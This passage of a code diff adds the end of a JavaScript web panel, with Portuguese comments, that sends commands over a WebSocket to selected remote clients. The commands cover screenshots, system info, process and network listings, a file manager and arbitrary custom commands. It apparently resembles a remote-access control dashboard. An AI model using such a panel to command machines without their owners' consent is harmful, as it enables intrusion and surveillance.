+            const uptime = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            document.getElementById('uptime').textContent = uptime;
+        }
+
+        // Abre gerenciador de arquivos
+        function openFileManager() {
+            if (!selectedClient) {
+                showNotification('Selecione um cliente primeiro', 'error');
+                return;
+            }
+            
+            sendCommand('file_manager');
+            showNotification('Abrindo gerenciador de arquivos...', 'info');
+        }
+
+        // Sistema de notificações
+        function showNotification(message, type = 'info') {
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type}`;
+            notification.innerHTML = `
+                <div class="notification-content">
+                    <span class="notification-icon">${getNotificationIcon(type)}</span>
+                    <span class="notification-message">${message}</span>
+                    <button class="notification-close" onclick="this.parentElement.parentElement.remove()">&times;</button>
+                </div>
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Auto remove após 5 segundos
+            setTimeout(() => {
+                if (notification.parentElement) {
+                    notification.remove();
+                }
+            }, 5000);
+        }
+
+        function getNotificationIcon(type) {
+            switch(type) {
+                case 'success': return '✓';
+                case 'error': return '✗';
+                case 'warning': return '⚠';
+                default: return 'ℹ';
+            }
+        }
+
+        // Envia comando para o cliente
+        function sendCommand(command) {
+            if (!selectedClient || !ws) return;
+            
+            ws.send(JSON.stringify({
+                type: 'send_command',
+                client_id: selectedClient,
+                command: { type: command }
+            }));
+            
+            // Add to command history
+            addCommandToHistory(`> ${command}`);
+        }
+
+        // Modal de comando customizado
+        function openCommandModal() {
+            document.getElementById('commandModal').style.display = 'flex';
+            document.getElementById('commandInput').focus();
+        }
+
+        function closeCommandModal() {
+            document.getElementById('commandModal').style.display = 'none';
+            document.getElementById('commandInput').value = '';
+        }
+
+        function handleCommandEnter(event) {
+            if (event.key === 'Enter') {
+                executeCustomCommand();
+            }
+        }
+
+        function executeCustomCommand() {
+            const command = document.getElementById('commandInput').value.trim();
+            if (!command) return;
+            
+            if (!selectedClient || !ws) {
+                showNotification('Nenhum cliente selecionado', 'error');
+                return;
+            }
+            
+            ws.send(JSON.stringify({
+                type: 'send_command',
+                client_id: selectedClient,
+                command: { type: 'custom', data: command }
+            }));
+            
+            addCommandToHistory(`Comando personalizado: ${command}`);
+            closeCommandModal();
+        }
+        
+        // Enhanced command functions with history tracking
+        function sendScreenshot() {
+            sendCommand('SCREENSHOT');
+            addCommandToHistory('Screenshot solicitado');
+        }
+        
+        function sendSysInfo() {
+            sendCommand('SYSINFO');
+            addCommandToHistory('Informações do sistema solicitadas');
+        }
+        
+        function sendTaskList() {
+            sendCommand('TASKLIST');
+            addCommandToHistory('Lista de processos solicitada');
+        }
+        
+        function sendNetStat() {
+            sendCommand('NETSTAT');
+            addCommandToHistory('Conexões de rede solicitadas');
+        }
+
+
+
+        // Inicializa a aplicação
+        document.addEventListener('DOMContentLoaded', function() {
+            connectWebSocket();
+            
+            // Fecha modal ao clicar fora
+            document.getElementById('commandModal').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    closeCommandModal();
+                }
+            });
+            
+            // Update performance stats periodically
+            setInterval(updatePerformanceStats, 1000);
+            setInterval(updateUptime, 1000);
+            
+            // Update current client display
+            setInterval(() => {
+                const currentClientSpan = document.getElementById('currentClient');
+                if (selectedClient && clients[selectedClient]) {
+                    currentClientSpan.textContent = clients[selectedClient].ip || selectedClient;
+                } else {
+                    currentClientSpan.textContent = 'Nenhum';
+                }
+            }, 500);
+        });
+    </script>
+</body>
+</html>
